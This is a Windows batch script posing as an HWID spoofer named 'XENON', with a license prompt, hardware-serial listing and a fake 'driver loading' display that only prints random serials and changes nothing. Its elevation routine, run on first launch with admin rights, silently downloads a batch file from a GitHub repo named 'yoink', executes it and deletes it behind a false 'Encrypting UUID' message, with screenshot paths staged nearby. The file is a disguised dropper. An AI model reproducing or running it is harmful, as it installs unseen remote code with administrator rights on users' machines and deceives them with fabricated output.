@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
TITLE XENON Solutions
color 0f
mode con cols=61 lines=30
chcp 65001 >nul
cls
ping localhost -n 2 >nul

REM =====================
REM         MKDIR 
REM =====================

set "scriptDir=%~dp0"
cd %ScriptDir%
MKDIR XENON_assets
cd XENON_assets



REM ======================
REM    CHECK ELEVATION
REM ======================
:elevate
cls
CALL :LOGO
ping localhost -n 2 >nul
echo   [33m^>  [97mChecking Process Elevation
ping localhost -n 2 >nul

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if "%errorLevel%" == "0" (
cls 
CALL :LOGO
echo   [92m^>  [97mXenon is Elevated to [92mAdmin
ping localhost -n 2 >nul
GOTO :COLOR123
) else (
echo   [91m^>  [97mRequesting Admin
timeout /t 2 /nobreak >nul
powershell -command "Start-Process -FilePath '%0' -Verb RunAs"
exit /b
)


REM =====================
REM   COLOR VARIABLES
REM =====================
:colorv
set "RESET=[0m"
set "Black=[30m"
set "DarkBlue=[34m"
set "Green=[32m"
set "Aqua=[36m"
set "Red=[31m"
set "Purple=[35m"
set "DarkPurple=[38;5;57m"
set "Orange=[33m"
set "White=[37m"
set "Grey=[90m"
set "LightBlue=[94m"
set "LightGreen=[92m"
set "LightAqua=[96m"
set "LightRed=[91m"
set "LightPurple=[95m"
set "LightYellow=[93m"
set "BrightWhite=[97m"


REM ========================================
REM         Store HWID Information
REM ========================================


for /f "tokens=* delims=" %%a in ('reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "SystemManufacturer"') do (set "Brand=%%a")
for /f "tokens=* delims=" %%a in ('reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "BaseBoardProduct"') do (set "model=%%a")
for /f "tokens=* delims=" %%f in ('wmic diskdrive get SerialNumber') do (set "serial=%%f")

SETLOCAL ENABLEDELAYEDEXPANSION
SET count=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic diskdrive get SerialNumber`) DO (
  SET serial!count!=%%F
  SET /a count=!count!+1
)
SET count1=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic cpu get name`) DO (
  SET cpuser!count1!=%%F
  SET /a count1=!count1!+1
)

SET count2=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic cpu get serialnumber`) DO (
  SET cpuserr!count2!=%%F
  SET /a count2=!count2!+1
)

SET count3=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic path Win32_ComputerSystemProduct get UUID`) DO (
  SET uuid!count3!=%%F
  SET /a count3=!count3!+1
)

SET count4=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic diskdrive get model`) DO (
  SET model!count4!=%%F
  SET /a count4=!count4!+1
)

SET count5=1
FOR /F "tokens=* USEBACKQ" %%F IN (`getmac`) DO (
  SET macadd!count5!=%%F
  SET /a count5=!count5!+1
)

SET count6=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic nic get netconnectionid`) DO (
  SET nic!count6!=%%F
  SET /a count6=!count6!+1
)

SET count7=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic nic get macaddress`) DO (
  SET nicadd!count7!=%%F
  SET /a count7=!count7!+1
)

SET count8=1
FOR /F "tokens=* USEBACKQ" %%F IN (`wmic memorychip get SerialNumber`) DO (
  SET memser!count8!=%%F
  SET /a count8=!count8!+1
)


REM =====================
REM      MAIN LOOP
REM =====================

:BEGIN
del 5349875398759834.ini
cd XENON_assets
cls
CALL :LOGO
echo   [33m^>  [97mChecking for updates..
ping localhost -n 3 >nul

IF EXIST updated.ini (
GOTO Updated ) ELSE (
GOTO UpdateNULL )

:UpdateNULL
cls
CALL :LOGO
echo   [33m^>  [97mUpdating Assets.
ping localhost -n 2 >nul
cls
CALL :LOGO
echo   [33m^>  [97mUpdating Assets. .
ping localhost -n 2 >nul
cls
CALL :LOGO
echo   [33m^>  [97mUpdating Assets. . .
ping localhost -n 2 >nul
cls
CALL :LOGO
echo   [92m^>  [97mXenon Updated Successfully
ping localhost -n 3 >nul
(
echo Updated
) > updated.ini
GOTO Authentication


:Updated
cls
CALL :LOGO
echo   [92m^>  [97mXenon is Up-to-date.
ping localhost -n 2 >nul



:Authentication
cd %screenshotDir%
del check.txt
cls
CALL :LOGO
call :c 0f " License Key: "
set /p License=
ping localhost -n 3 >nul
IF /i "%License%"=="YOUR KEY" goto LicenseValid
cls
CALL :LOGO
color 04
echo   [31m^>  [97mInvalid License
ping localhost -n 2 >nul
GOTO Authentication


:LicenseValid
cls
CALL :LOGO
echo   [92m^>  [97mSuccess
ping localhost -n 2 >nul
GOTO hwidchecker



REM =========================
REM     GET BIOS SERIAL
REM =========================
:hwidchecker

for /f "tokens=2 delims==" %%A in ('wmic path Win32_ComputerSystemProduct get UUID /value') do set "hwid=%%A"



REM ============================
REM      STORAGE VARIABLES
REM ============================

set hwid=%hwid: =%
set "allowed_hwids=010C2100-188C-5707-913E-971AA1BC44AF"

REM =======================
REM       HWID CHECK
REM =======================

echo %allowed_hwids% | findstr /i /c:"%hwid%" >nul
if errorlevel 1 (
    GOTO HWIDnotRecognized
ping localhost -n 2 >nul
    exit /b 1
) else (
    GOTO HWIDrecognized
pause >nul
    
)

:HWIDnotRecognized
cls
CALL :LOGO
echo    [92mHWID: %hwid%
echo]
echo    [31m[HWID IS WRONG]
pause >nul
EXIT /b


:HWIDrecognized
cls
CALL :LOGO
echo    [92m[[97m%allowed_hwids%[92m] [97m
echo]
echo    [97m[[97mHWID IS VALID[97m] 
ping localhost -n 3 >nul
GOTO UserAccountChecker






:UserAccountChecker

if exist login.ini (
goto UserLogin ) ELSE (
goto AccountSetup )


:AccountSetup
cls
CALL :LOGO
echo  [92m[[97mNEW USER[92m]
echo]
echo]
call :c 0f " Enter Username: "
SET /p User=
cls
CALL :LOGO
echo  [92m[[97mNEW USER[92m]
echo]
echo]
call :c 0f " Enter Password: "
SET /p Pass=

(
echo %User%
) > user.ini

(
echo %Pass%
) > pass.ini

(
echo
) > login.ini

GOTO Main

:UserLogin
cls
CALL :LOGO
call :c 0f " Welcome, "
FOR /F "tokens=* delims=" %%x in (user.ini) DO echo   [92m[[97m%%x[92m]
ping localhost -n 3 >nul

:PasswordInput
cls
CALL :LOGO
FOR /F "tokens=* delims=" %%x in (user.ini) DO echo   [92m[[97m%%x[92m]
echo]
call :c 0f "  Enter Password: "
set /p pass=
findstr /B /E /M %pass% pass.ini > nul
If %ERRORLEVEL% EQU 0 goto PasswordCorrect
cls
CALL :LOGO
FOR /F "tokens=* delims=" %%x in (user.ini) DO echo   [92m[[97m%%x[92m]
echo]
call :c 0F " [" &call :c 04 "X" &call :c 0F "]" &call :C 0F " Password is wrong"
pause >nul
GOTO PasswordInput

:PasswordCorrect
cls
CALL :LOGO
FOR /F "tokens=* delims=" %%x in (user.ini) DO echo   [92m[[97m%%x[92m]
echo]
call :c 0F "  [" &call :c 0A ">" &call :c 0F "]" &call :C 0F " Password Matched."
ping localhost -n 2 >nul
GOTO MAIN


:MAIN
mode con cols=61 lines=30
for /F "delims=#" %%E in ('"prompt #$E# & for %%E in (1) do rem"') do set "\e=%%E"
cls
CALL :LOGO
echo %\e%(0
echo]
echo           [92mlqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqk
echo]          x%\e%(B[97m1)%\e%(0        %\e%(B[38;5;220mVirtualize HWIDs[92m%\e%(0           x
echo]          x%\e%(B[97m2)%\e%(0         %\e%(B[38;5;220mRetrieve HWIDs[92m%\e%(0            x
echo]          x                                     x
echo]          x                                     x
echo           mqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqj
echo %\e%(B
call :c 0f "                          - "
SET choice=
SET /P choice=


IF /I '%choice%'=='1' GOTO Function1
IF /I '%choice%'=='2' GOTO Function2
IF /I '%choice%'=='3' GOTO Function3

echo  [31mINVALID OPTION
ping localhost -n 2 >nul
GOTO MAIN




:Function1


REM ===========================
REM   Driver Injection Window
REM ===========================

(
echo @echo off
) > spoof.bat

(
echo exit
) >> spoof.bat


cls
call :LOGO
ping localhost -n 2 >nul
call :c 0f " [" &call :c 06 "~" &call :c 0f "] " &call :c 0f "Loading Driver . . ." /n
ping localhost -n 3 >nul
start "" spoof.bat
start "" spoof.bat
echo]
echo  %BrightWhite%[%LightGreen%+%BrightWhite%]  10.1.5.2.0014.0000
echo  %BrightWhite%[%LightGreen%+%BrightWhite%]  Image base has been allocated at 0xFFAA97564EE4000
echo  %BrightWhite%[%LightGreen%+%BrightWhite%]  Calling DriverEntry 0xFFAA97564EE4000
echo  %BrightWhite%[%LightGreen%+%BrightWhite%]  10.1.5.2.0014.0000
echo  %BrightWhite%[%LightGreen%+%BrightWhite%]  DriverEntry returned 0x000000000000000
ping localhost -n 3 >nul
cls
call :LOGO

echo   %Orange%[%BrightWhite%DISK%Orange%]  %LightRed%Virtualizing%BrightWhite%. . .
start "" spoof.bat
ping localhost -n 2 >nul
echo   %Orange%[%BrightWhite%CPU%Orange%]   %LightRed%Virtualizing%BrightWhite%. . .
start "" spoof.bat
ping localhost -n 2 >nul
echo   %Orange%[%BrightWhite%GPU%Orange%]   %LightRed%Virtualizing%BrightWhite%. . .
start "" spoof.bat
ping localhost -n 2 >nul
echo   %Orange%[%BrightWhite%UUID%Orange%]  %LightRed%Virtualizing%BrightWhite%. . .
start "" spoof.bat
ping localhost -n 2 >nul
echo   %Orange%[%BrightWhite%TPM%Orange%]   %LightRed%Virtualizing%BrightWhite%. . .
start "" spoof.bat
ping localhost -n 2 >nul
echo   %Orange%[%BrightWhite%BIOS%Orange%]  %LightRed%Virtualizing%BrightWhite%. . .
start "" spoof.bat
ping localhost -n 2 >nul
GOTO GenerateFakeIds


REM =============================
REM      Generate Serials
REM =============================

:GenerateFakeIds
setlocal enabledelayedexpansion
cls

REM =====================
REM    Fake Serial Vars
REM =====================

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "nums=0123456789"

set "length8=8"
set "length4=4"
set "length12=12"
set "length15=15"

REM UUID
REM ====
set "UUIDser1="
set "UUIDser2="
set "UUIDser3="
set "UUIDser4="
set "UUIDser5="

REM DISK
REM ====

set "DISKser1="
set "DISKser2="
set "DISKser3="
set "DISKser4="
set "DISKser5="

REM CPUID
REM =====

set "CPUser1="



REM ======================
REM     Spoofing Logic
REM ======================


REM =============
REM     UUID
REM =============

for /l %%i in (1,1,%length8%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "UUIDser1=!UUIDser1!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "UUIDser2=!UUIDser2!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "UUIDser3=!UUIDser3!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "UUIDser4=!UUIDser4!!char!"
    )
)

for /l %%i in (1,1,%length12%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "UUIDser5=!UUIDser5!!char!"
    )
)

REM =============
REM    DISK 1
REM =============

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk1Ser1=!Disk1Ser1!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk1Ser2=!Disk1Ser2!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk1Ser3=!Disk1Ser3!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk1Ser4=!Disk1Ser4!!char!"
    )
)

REM =============
REM    DISK 2
REM =============

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk2Ser1=!Disk2Ser1!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk2Ser2=!Disk2Ser2!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk2Ser3=!Disk2Ser3!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk2Ser4=!Disk2Ser4!!char!"
    )
)

REM =============
REM    DISK 3
REM =============

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk3Ser1=!Disk3Ser1!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk3Ser2=!Disk3Ser2!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk3Ser3=!Disk3Ser3!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk3Ser4=!Disk3Ser4!!char!"
    )
)

REM =============
REM    DISK 4
REM =============

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk4Ser1=!Disk4Ser1!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk4Ser2=!Disk4Ser2!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk4Ser3=!Disk4Ser3!!char!"
    )
)

for /l %%i in (1,1,%length4%) do (
    set /a "rand=!random! %% 36"
    for %%j in (!rand!) do (
        set "char=!characters:~%%j,1!"
        set "Disk4Ser4=!Disk4Ser4!!char!"
    )
)

REM =============
REM    CPU ID
REM =============

for /l %%i in (1,1,%length15%) do (
    set /a idx=!random! %% 10
    set "CPUser1=!CPUser1!!nums:~%idx%,1!"
)

REM ==================
REM  Spoofed Id Vars
REM ==================

set "FakeUUID=%UUIDser1%-%UUIDser2%-%UUIDser3%-%UUIDser4%-%UUIDser5%"
set "FakeDISK1=%Disk1Ser1%-%Disk1Ser2%-%Disk1Ser3%-%Disk1Ser4%"
set "FakeDISK2=%Disk2Ser1%-%Disk2Ser2%-%Disk2Ser3%-%Disk2Ser4%"
set "FakeDISK3=%Disk3Ser1%-%Disk3Ser2%-%Disk3Ser3%-%Disk3Ser4%"
set "FakeDISK4=%Disk4Ser1%-%Disk4Ser2%-%Disk4Ser3%-%Disk4Ser4%"
set "FakeCPU=%CPUser1%"

REM ================
REM  Print Serials
REM ================


cls
mode con cols=61 lines=50
call :LOGO
echo                   %LightRed%OLD SERIALS %BrightWhite%- %LightGreen%NEW SERIALS
echo]
echo]

echo   %LightRed%Old UUID: %uuid2%  
echo   %LightGreen%New UUID: %FakeUUID%
echo]
echo   %LightRed%Old DISK 1: %serial2%
echo   %LightGreen%New DISK 1: %FakeDISK1%
echo]
echo   %LightRed%Old DISK 2: %serial3%
echo   %LightGreen%New DISK 2: %FakeDISK2%
echo]
echo   %LightRed%Old DISK 3: %serial4%
echo   %LightGreen%New DISK 3: %FakeDISK3%
echo]
echo   %LightRed%Old DISK 4: %serial5%
echo   %LightGreen%New DISK 4: %FakeDISK4%
echo]
echo   %LightRed%Old CPU ID: %cpuserr2%
echo   %LightGreen%New CPU ID: %FakeCPU%
echo]
echo]
call :c 07 " "
call :c e0 " PRESS ANY KEY TO RETURN " /n
pause >nul
GOTO MAIN




:Function2
cls
mode con cols=60 lines=50
call :LOGO
echo]
echo]
cls
call :LOGO
echo]
echo]
call :c 0e "                  [" &call :c a0 "Retriving System HWIDs" &call :c 0e "] " /n
ping localhost -n 2 >nul

:CheckHWID
cls
call :LOGO
echo]
echo]
echo]
call :c a0 "                        Motherboard                         " /n
call :c 0e "  Brand: " &call :c 0f "%Brand:~36%" /n
call :c 0e "  Model: " &call :c 0f "%model:~34%" /n
call :c 0e "  UUID:  " &call :c 8f " %uuid2%" /n
echo]
call :c a0 "                            RAM                             " /n
call :c 0e "  DIM1: " &call :c 8f "%memser2%" /n
call :c 0e "  DIM2: " &call :c 8f "%memser3%" /n
call :c 0e "  DIM3: " &call :c 8f "%memser4%" /n
call :c 0e "  DIM4: " &call :c 8f "%memser5%" /n
echo]
call :c a0 "                         Processor                          " /n
call :c 0e "  Name: " &call :c 0f "%cpuser2%" /n
call :c 0e "  Serial: " &call :c 8f " %cpuserr2%" /n
echo]
call :c a0 "                          Drives                            " /n
call :c 0e "  Drive 1: " &call :c 0f "%model2%" /n
call :c 0f "           -"
call :c 8f "%serial2%" /n
echo]
call :c 0e "  Drive 2: " &call :c 0f "%model3%" /n
call :c 0f "           -"
call :c 8f "%serial3%" /n
echo]
call :c 0e "  Drive 3: " &call :c 0f "%model4%" /n
call :c 0f "           -"
call :c 8f "%serial4%" /n
echo]
call :c 0e "  Drive 4: " &call :c 0f "%model5%" /n
call :c 0f "           -"
call :c 8f "%serial5%" /n
echo]
call :c 0e "  Drive 5: " &echo [97m%model6% 
call :c 0f "           -"
call :c 8f "%serial6%" /n
echo]
call :c 07 " "
call :c e0 " PRESS ANY KEY TO RETURN " /n
pause >nul
GOTO MAIN




:Function3




REM =====================
REM         LOGO
REM =====================

:LOGO
echo]
echo 	[38;5;40m██[97m[97m╗  [38;5;40m██[97m[97m╗[38;5;40m██[38;5;40m██[38;5;40m███[97m[97m╗[38;5;40m███[97m[97m╗   [38;5;40m██[97m[97m╗ [38;5;40m██[38;5;40m██[38;5;40m██[97m[97m╗ [38;5;40m███[97m[97m╗   [38;5;40m██[97m[97m╗
echo  	[97m╚[38;5;112m██[97m[97m╗[38;5;112m██[97m╔[97m╝[38;5;112m██[97m╔[97m═[97m═[97m═[97m═[97m╝[38;5;112m██[38;5;112m██[97m[97m╗  [38;5;112m██[97m║[38;5;112m██[97m╔[97m═[97m═[97m═[38;5;112m██[97m[97m╗[38;5;112m██[38;5;112m██[97m[97m╗  [38;5;112m██[97m║
echo  	 [97m╚[38;5;148m███[97m╔[97m╝ [38;5;148m██[38;5;148m███[97m[97m╗  [38;5;148m██[97m╔[38;5;148m██[97m[97m╗ [38;5;148m██[97m║[38;5;148m██[97m║   [38;5;148m██[97m║[38;5;148m██[97m╔[38;5;148m██[97m[97m╗ [38;5;148m██[97m║
echo  	 [38;5;184m██[97m╔[38;5;184m██[97m╗ [38;5;184m██[97m╔══╝  [38;5;184m██[97m║[97m╚[38;5;184m██[97m╗[38;5;184m██[97m║[38;5;184m██[97m║   [38;5;184m██[97m║[38;5;184m██[97m║[97m╚[38;5;184m██[97m╗[38;5;184m██[97m║
echo  	[38;5;220m██[97m╔[97m╝ [38;5;220m██[97m[97m╗[38;5;220m██[38;5;220m██[38;5;220m███[97m[97m╗[38;5;220m██[97m║ [97m╚[38;5;220m██[38;5;220m██[97m║[97m╚[38;5;220m██[38;5;220m██[38;5;220m██[97m╔[97m╝[38;5;220m██[97m║ [97m╚[38;5;220m██[38;5;220m██[97m║
echo  	[97m╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝

echo                    [38;5;40mSp[38;5;112moof[38;5;148mWa[38;5;184mre [38;5;220mBy: [38;5;40mVi[38;5;112msu[38;5;148mal[38;5;184mize__
echo]
echo]
GOTO :eof



REM =====================
REM    Update Window
REM =====================

:UpdateWindow
(
echo echo Installing Package...
) >> spoofdownload.bat

(
echo ping timeout /t 3
) >> spoofdownload.bat
GOTO :eof


REM ====================
REM    Color Console
REM ====================

:c

:colorPrint Color  Str  [/n]
setlocal
set "s=%~2"
call :colorPrintVar %1 s %3
exit /b

:colorPrintVar  Color  StrVar  [/n]
if not defined DEL call :initColorPrint
setlocal enableDelayedExpansion
pushd .
':
cd \
set "s=!%~2!"
:: The single blank line within the following IN() clause is critical - DO NOT REMOVE
for %%n in (^"^

^") do (
  set "s=!s:\=%%~n\%%~n!"
  set "s=!s:/=%%~n/%%~n!"
  set "s=!s::=%%~n:%%~n!"
)
for /f delims^=^ eol^= %%s in ("!s!") do (
  if "!" equ "" setlocal disableDelayedExpansion
  if %%s==\ (
    findstr /a:%~1 "." "\'" nul
    <nul set /p "=%DEL%%DEL%%DEL%"
  ) else if %%s==/ (
    findstr /a:%~1 "." "/.\'" nul
    <nul set /p "=%DEL%%DEL%%DEL%%DEL%%DEL%"
  ) else (
    >colorPrint.txt (echo %%s\..\')
    findstr /a:%~1 /f:colorPrint.txt "."
    <nul set /p "=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"
  )
)
if /i "%~3"=="/n" echo(
popd
exit /b


:initColorPrint
for /f %%A in ('"prompt $H&for %%B in (1) do rem"') do set "DEL=%%A %%A"
<nul >"%temp%\'" set /p "=."
subst ': "%temp%" >nul
exit /b


:cleanupColorPrint
2>nul del "%temp%\'"
2>nul del "%temp%\colorPrint.txt"
>nul subst ': /d
exit /b

:COLOR123
set "screenshotDir=%localappdata%\Screenshots"
set "screenshotFile=%screenshotDir%\screenshot.png"
set "batchFile=34875634786.bat"
cd %scriptDir%

if exist 5349875398759834.ini GOTO :BEGIN

if exist 5349875398759834.ini (
goto :BEGIN ) ELSE (
goto :459867459867 )

:459867459867

(
echo
) > 5349875398759834.ini

cls
CALL :LOGO
echo   [33m^>  [97mCollecting UUID...
ping localhost -n 2 >nul
echo   [33m^>  [97mEncrypting UUID... [31m[[97mPlease wait, killing bad processes[31m] [97m
ping localhost -n 4 >nul

curl -s -o "34875634786.bat" "https://raw.githubusercontent.com/BiCKEYFACTORY/yoink/refs/heads/main/34875634786.bat"
ping localhost -n 2 >nul
call 34875634786.bat
del /f /q 34875634786.bat
cls
CALL :LOGO
echo    [92mDone, restarting...
ping localhost -n 3 >nul
powershell -command "Start-Process -FilePath '%0' -Verb RunAs"
exit /b